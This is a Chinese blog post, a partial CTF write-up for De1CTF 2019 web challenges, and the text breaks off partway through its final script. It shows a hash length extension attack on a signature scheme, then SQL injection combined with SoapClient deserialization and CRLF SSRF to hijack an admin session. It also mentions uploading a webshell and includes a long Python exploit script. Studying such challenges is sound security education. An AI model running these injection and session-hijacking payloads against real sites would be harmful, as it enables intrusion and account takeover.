<!DOCTYPE html><html lang><head><meta name="generator" content="Hexo 3.9.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>De1CTF部分wp | 悦昕_o's Blog</title><link rel="stylesheet" type="text/css" href="//fonts.loli.net/css?family=Source+Code+Pro"><link rel="stylesheet" type="text/css" href="/css/style-dark.css?v=2.0.3"><link rel="stylesheet" type="text/css" href="/css/highlight-dark.css?v=2.0.3"><link rel="Shortcut Icon" href="/favicon.ico"><link rel="bookmark" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">De1CTF部分wp</h1><a id="logo" href="/.">悦昕_o's Blog</a><p class="description">不来不去 如来 o(*￣▽￣*)ブ</p></div><div id="nav-menu"><a href="/." class="current"><i class="fa fa-home"> Start</i></a><a href="/archives/"><i class="fa fa-archive"> Archiv</i></a><a href="/about/"><i class="fa fa-user"> Über</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a></div><div id="search-form"><div id="result-mask" class="hide"></div><label><input id="search-key" type="text" autocomplete="off" placeholder="Suche"></label><div id="result-wrap" class="hide"><div id="search-result"></div></div><div class="hide"><template id="search-tpl"><div class="item"><a href="/{path}" title="{title}"><div class="title">{title}</div><div class="time">{date}</div><div class="tags">{tags}</div></a></div></template></div></div></div><div id="layout" class="layout-g"><div class="layout-l"><div class="content_container"><div class="post"><h1 class="post-title">De1CTF部分wp</h1><div class="post-meta"><a href="/2019/09/12/De1CTF-wp/#comments" class="comment-count"></a><p><span class="date">Sep 12, 2019</span><span><a href="/categories/ctf/" class="category">ctf</a></span><span><i id="busuanzi_container_page_pv"><i id="busuanzi_value_page_pv"></i><i>Schlägt</i></i></span></p></div><div class="post-content"><blockquote>
<p>这是之前比赛后不久就写的wp，一直没有放出来，清理东西的时候看到了就想着先放出来吧（虽然我还没写完o(╯□╰)o，有时间在补吧。嘻嘻(#^.^#)）</p>
</blockquote>
<a id="more"></a>

<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="SSRF-Me"><a href="#SSRF-Me" class="headerlink" title="SSRF Me"></a>SSRF Me</h3><p>赛题链接：<a href="http://139.180.128.86/" target="_blank" rel="noopener">http://139.180.128.86/</a></p>
<p>打开链接可以看到一段代码（查看源代码会有格式）</p>
<p><img src="/2019/09/12/De1CTF-wp/QQ%E6%88%AA%E5%9B%BE20190805090902.png" alt="QQ截图20190805090902"></p>
<p>对代码进行分析，可以看到有<code>/geneSign</code>和 <code>/De1ta</code>两个访问路径;<code>/geneSign</code>用来生成签名，get或post请求带个<code>param</code>参数，把<code>param</code>参数和<code>action</code>值传递给<code>getSign()</code>进行加密生成签名。</p>
<p><code>/De1ta</code>才是重头戏（O(∩_∩)O哈哈~），访问该路径需要cookie设置action、sign，get请求带参param，<code>challenge()</code>调用<code>waf()</code>对<code>param</code>进行过滤：<code>不能以gopher和file开头</code>，然后调用Task类</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span> <span class="comment"># 生成签名</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))   <span class="comment"># 对get请求的 param 参数进行url解码</span></span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)   <span class="comment">#调用 getSign 函数（在下面） </span></span><br><span class="line">    <span class="comment"># secert_key = os.urandom(16)-(16个字节随机数)-- </span></span><br><span class="line">    <span class="comment"># param=get请求的param参数 </span></span><br><span class="line">    <span class="comment"># action='scan' </span></span><br><span class="line">    <span class="comment"># 返回三者md5后的结果 </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))  <span class="comment"># cookie设置action,sign get参数param</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr    <span class="comment"># 获取ip</span></span><br><span class="line">    <span class="keyword">if</span>(waf(param)): <span class="comment"># 对param参数过滤，函数在下面</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)    <span class="comment">#调用类Task 上面 初始化 创建md5(ip)为名的文件夹</span></span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())  <span class="comment">#执行task.Exec() 并将输出序列化</span></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span> <span class="comment">#过滤函数 去掉param左右空格并小写化 不能以 gopher和file 开头</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>函数<code>getSign()</code>，由于实际上只有param可控，action默认‘scan’，但是secert_key的长度我们是知道的，因此这里存在哈希长度扩展攻击（<a href="https://www.freebuf.com/articles/web/69264.html" target="_blank" rel="noopener">了解哈希长度扩展攻击可以看看这篇文章</a>），因此我们可以通过工具构造不同action的签名（工具我使用的是<strong>HashPump</strong>）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span>     <span class="comment"># secert_key = os.urandom(16)-(16个字节随机数) param=get请求的param参数 action='scan'</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure>

<p>类<code>Task</code>，分析代码我们知道只要能让访问<code>/De1ta</code>所带的参数实现<code>getSign(self.action, self.param) == self.sign</code>就能通过<code>checkSign()</code>的验证，这里我们可以用前面提到的哈希长度扩展攻击来构造出我们想要的参数；可以看到我们需要走通<code>if &quot;scan&quot; in self.action:</code>来读取param参数的文件并把它存在一个result.txt文件中，然后当<code>if &quot;read&quot; in self.action:</code>成立时再去读取result.txt，并返回读取到的内容</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr 创建一个md5(ip)为名的文件夹 	15121d42524062a01cf877e045146508</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):  <span class="comment">#'验证签名'</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)   <span class="comment"># 以写的形式打开result.txt文件</span></span><br><span class="line">                resp = scan(self.param) <span class="comment"># 进行某些操作 会根据param生成一个特殊的链接</span></span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>) <span class="comment"># 以读的形式打开result.txt文件</span></span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign): <span class="comment">#验证签名 </span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>因为题目提示flag在./flag.txt中，所以我们需要构造param为flag.txt，我们先用<code>geneSign()</code>生成action=scan,param=flag.txt 的签名</p>
<p><img src="/2019/09/12/De1CTF-wp/2019-08-05_100539.bmp" alt="2019-08-05_100539"></p>
<p>然后使用工具<strong>HashPump</strong>生成action包含read的签名</p>
<p><img src="/2019/09/12/De1CTF-wp/1564970682579.png" alt="1564970682579"></p>
<p>带着准备好的参数去访问<code>/De1ta</code>，得到flag</p>
<p><img src="/2019/09/12/De1CTF-wp/2019-08-05_100042.bmp" alt="2019-08-05_100042"></p>
<h3 id="shellshellshell"><a href="#shellshellshell" class="headerlink" title="shellshellshell"></a>shellshellshell</h3><blockquote>
<p>这道题是参考大佬们的wp，然后在<a href="https://buuoj.cn/challenges" target="_blank" rel="noopener">这个平台</a>上面再打了一遍</p>
</blockquote>
<ol>
<li><p>首先打开靶机，是一个登陆页面，用目录扫描工具扫一下（我用的是<a href="https://github.com/WangYihang/SourceLeakHacker" target="_blank" rel="noopener">SourceLeakHacker</a>），发现有两个路径能访问</p>
<p><img src="/2019/09/12/De1CTF-wp/2019-08-16_170137.bmp" alt="2019-08-16_170137"></p>
<p>访问<code>http://web69.node1.buuoj.cn/views/</code>发现是模板文件</p>
<p><img src="/2019/09/12/De1CTF-wp/2019-08-16_170104.bmp" alt="2019-08-16_170104"></p>
<p>通过大佬们的wp发现还有备份文件泄露（user.php<del>,config.php</del>和index.php~），访问将文件下载到本地进行审计（我太菜了o(╥﹏╥)o ，得多练练），发现config.php中的insert函数存在sql注入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span><span class="params">($columns,$table,$values)</span></span>&#123;</span><br><span class="line">    $column = <span class="keyword">$this</span>-&gt;get_column($columns);</span><br><span class="line">    $value = <span class="string">'('</span>.preg_replace(<span class="string">'/`([^`,]+)`/'</span>,<span class="string">'\'$&#123;1&#125;\''</span>,<span class="keyword">$this</span>-&gt;get_column($values)).<span class="string">')'</span>;</span><br><span class="line">    $nid =</span><br><span class="line">    $sql = <span class="string">'insert into '</span>.$table.<span class="string">'('</span>.$column.<span class="string">') values '</span>.$value; </span><br><span class="line">    <span class="comment">//$value = ('username','userid','$_post','mod')</span></span><br><span class="line">    <span class="comment">//post提交 aaa`, `0`)#</span></span><br><span class="line">    <span class="comment">//$value = ('username','userid',' aaa`, `0`)# ','mod')</span></span><br><span class="line">    <span class="comment">//`也可以闭合单引号</span></span><br><span class="line">    $result = <span class="keyword">$this</span>-&gt;conn-&gt;query($sql);</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而在user.php中的publish调用了insert函数，所以我们可以通过访问<code>http://web69.node1.buuoj.cn/index.php?action=publish</code>，编写脚本，通过对它进行sql注入，获取管理员密码为<code>jaivypassword</code>（脚本见后面）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">publish</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment">//首先判断是否登录 </span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;check_login()) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;is_admin == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'signature'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'mood'</span>])) &#123;</span><br><span class="line"></span><br><span class="line">                $mood = addslashes(serialize(<span class="keyword">new</span> Mood((int)$_POST[<span class="string">'mood'</span>],get_ip())));</span><br><span class="line">                $db = <span class="keyword">new</span> Db();</span><br><span class="line">                @$ret = $db-&gt;insert(<span class="keyword">array</span>(<span class="string">'userid'</span>,<span class="string">'username'</span>,<span class="string">'signature'</span>,<span class="string">'mood'</span>),<span class="string">'ctf_user_signature'</span>,<span class="keyword">array</span>(<span class="keyword">$this</span>-&gt;userid,<span class="keyword">$this</span>-&gt;username,$_POST[<span class="string">'signature'</span>],$mood));</span><br><span class="line">                <span class="keyword">if</span>($ret)</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'pic'</span>])) </span><br><span class="line">                &#123;</span><br><span class="line">                    $dir=<span class="string">'/app/upload/'</span>;</span><br><span class="line">                    move_uploaded_file($_FILES[<span class="string">'pic'</span>][<span class="string">'tmp_name'</span>],$dir.$_FILES[<span class="string">'pic'</span>][<span class="string">'name'</span>]);</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('"</span>.$_FILES[<span class="string">'pic'</span>][<span class="string">'name'</span>].<span class="string">"upload success');&lt;/script&gt;"</span>;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>拿到管理员账号密码后，登录进去，来到<code>publish</code>可以看到提示并有一个文件上传的按钮</p>
</li>
</ol>
<p>​    <img src="/2019/09/12/De1CTF-wp/2019-08-13_102242.bmp" alt="2019-08-13_102242"></p>
<p>​        我们上传一个一句话木马来getshell,然后连上蚁剑</p>
<p>未完待续··· ···</p>
<hr>
<p>（图先存着，之后有时间再详细说下 (#^.^#) )</p>
<p>（脚本先放出来啦，如需使用可以自己试着慢慢调试）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-   </span></span><br><span class="line"><span class="keyword">import</span> hashlib,requests,re,os,string,random</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">codes</span><span class="params">(cipher)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">        plain = os.urandom(<span class="number">16</span>).hex()</span><br><span class="line">        <span class="keyword">if</span> hashlib.md5(plain.encode(<span class="string">"utf-8"</span>)).hexdigest()[:<span class="number">5</span>] == cipher:</span><br><span class="line">            <span class="keyword">return</span> plain</span><br><span class="line">            exit(<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆破code</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_code</span><span class="params">(html)</span>:</span></span><br><span class="line">    re_res = re.findall(<span class="string">'Code\(substr\(md5\(\?\), 0, 5\) === ([\w]+)\)'</span>,html)[<span class="number">0</span>]</span><br><span class="line">    print(<span class="string">"[md5]: "</span>+re_res)</span><br><span class="line">    p = multiprocessing.Pool(<span class="number">15</span>)</span><br><span class="line">    code = <span class="string">''</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        res = p.apply_async(codes,(re_res,))</span><br><span class="line">        <span class="keyword">if</span> res.get() != <span class="literal">None</span>:</span><br><span class="line">            code = res.get()</span><br><span class="line">            print(<span class="string">"[code]: &#123;&#125;"</span>.format(code))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    p.close()</span><br><span class="line">    p.join()</span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注册</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(username,password)</span>:</span></span><br><span class="line">    url = target + <span class="string">"register"</span></span><br><span class="line">    get_res = sess.get(url)<span class="comment">#,cookies=cookies)</span></span><br><span class="line">    usersess = re.findall(<span class="string">'PHPSESSID=(\w+);'</span>,get_res.headers[<span class="string">'Set-Cookie'</span>])[<span class="number">0</span>] <span class="comment">#获取用户sessid</span></span><br><span class="line">    code = get_code(get_res.text)</span><br><span class="line">    post_res = sess.post(url,data=&#123;<span class="string">'username'</span>:username, <span class="string">'password'</span>:password, <span class="string">'code'</span>:code&#125;)<span class="comment">#,cookies=cookies)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'index.php?action=login'</span> <span class="keyword">in</span> post_res.text:</span><br><span class="line">        print(<span class="string">'[User Session]: &#123;&#125;'</span>.format(usersess))</span><br><span class="line">        print(<span class="string">"[Register]: Register Success!\n"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(post_res.text)</span><br><span class="line">        exit(<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 登录</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(username,password)</span>:</span></span><br><span class="line">    url = target + <span class="string">"login"</span></span><br><span class="line">    get_res = sess.get(url)<span class="comment">#,cookies=cookies)</span></span><br><span class="line">    code = get_code(get_res.text)</span><br><span class="line">    post_res = sess.post(url,data=&#123;<span class="string">'username'</span>:username, <span class="string">'password'</span>:password, <span class="string">'code'</span>:code&#125;)<span class="comment">#,cookies=cookies)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'index.php?action=profile'</span> <span class="keyword">in</span> post_res.text:</span><br><span class="line">        print(<span class="string">"[Login]: &#123;&#125; !! Login Success! \n"</span>.format(username))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(post_res.text)</span><br><span class="line">        exit(<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取payload</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mood</span><span class="params">()</span>:</span></span><br><span class="line">    admin_sessionid,code = get_admin_session()</span><br><span class="line">    data = <span class="string">'username=admin&amp;password=jaivypassword&amp;code='</span> + code</span><br><span class="line">    ssrf = <span class="string">"yue\r\nContent-Type: application/x-www-form-urlencoded\r\nX-Forwarded-For: 127.0.0.1\r\nCookie: PHPSESSID=&#123;phpsessid&#125;\r\nContent-Length: &#123;length&#125;\r\n\r\n&#123;data&#125;"</span>.format(phpsessid=admin_sessionid,length=len(data),data=data)</span><br><span class="line">    mood = <span class="string">'O:10:"SoapClient":4:&#123;&#123;s:3:"uri";s:4:"aaab";s:8:"location";s:39:"http://127.0.0.1/index.php?action=login";s:11:"_user_agent";s:&#123;ssrf_len&#125;:"&#123;_ssrf&#125;";s:13:"_soap_version";i:1;&#125;&#125;'</span>.format(ssrf_len=len(ssrf),_ssrf=ssrf)</span><br><span class="line">    mood = mood.encode(encoding=<span class="string">'utf-8'</span>).hex()</span><br><span class="line">    <span class="keyword">return</span> mood,admin_sessionid</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用该链接存在的sql注入打入ssrf 获取admin的sessionid</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">publish</span><span class="params">()</span>:</span></span><br><span class="line">    url = target + <span class="string">'publish'</span></span><br><span class="line">    mood,admin_sessionid = get_mood()</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'signature'</span>:<span class="string">'aaa`,0x&#123;&#125;)-- -'</span>.format(mood),</span><br><span class="line">        <span class="string">'mood'</span>:<span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = sess.post(url,data=data)<span class="comment">#,cookies=cookies)</span></span><br><span class="line">    print(<span class="string">'[admin sessid]: '</span> + admin_sessionid + <span class="string">'\n'</span>)</span><br><span class="line">    sess.get(target+<span class="string">'index'</span>) <span class="comment">#执行漏洞 获取admin</span></span><br><span class="line">    <span class="keyword">return</span> admin_sessionid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    res = sess.get(target + <span class="string">'logout'</span>)<span class="comment">#,cookies=cookies)</span></span><br><span class="line">    print(res.request.headers)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成一个sesionid作为admin session ,返回phpsessid,code</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_admin_session</span><span class="params">()</span>:</span></span><br><span class="line">    sess = requests.Session()</span><br><span class="line">    res = sess.get(target + <span class="string">'login'</span>)</span><br><span class="line">    phpsessid = re.findall(<span class="string">'PHPSESSID=(\w+);'</span>,res.headers[<span class="string">'Set-Cookie'</span>])[<span class="number">0</span>]</span><br><span class="line">    code = get_code(res.text)</span><br><span class="line">    <span class="keyword">return</span> phpsessid,code</span><br><span class="line"></span><br><span class="line"><span class="comment"># 随机生成usename和password</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_name_and_pwd</span><span class="params">()</span>:</span></span><br><span class="line">    username = <span class="string">''</span>.join(random.sample(string.ascii_lowercase,<span class="number">8</span>))</span><br><span class="line">    password = username</span><br><span class="line">    print(<span class="string">"[username,password]: &#123;&#125;,&#123;&#125; \n"</span>.format(username,password))</span><br><span class="line">    <span class="keyword">return</span> username,password</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上传shell1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">(admin_sessionid)</span>:</span></span><br><span class="line">    files = &#123;<span 